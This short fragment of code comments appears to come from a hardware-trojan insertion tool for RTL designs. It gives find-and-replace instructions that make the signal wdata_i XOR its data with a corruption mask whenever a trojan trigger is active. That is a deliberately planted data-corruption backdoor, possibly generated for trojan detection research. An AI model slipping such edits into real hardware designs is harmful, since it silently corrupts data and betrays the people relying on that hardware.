 ...
 * Payload: Corrupt wdata_i with XOR mask
 * 
...
// ============================================================
// Integrity Violation: Corrupt wdata_i with XOR
//
// Integration Script Must Modify:
//
// IF wdata_i is assigned:
//   Find: assign wdata_i = data_value;
//   Replace: assign wdata_i = trojan_active ? (data_value ^ CORRUPTION_MASK) : data_value;
//
// IF wdata_i is in always_ff:
//   Find: wdata_i <= data_value;
//   Replace: wdata_i <= trojan_active ? (data_value ^ CORRUPTION_MASK) : data_value;
//
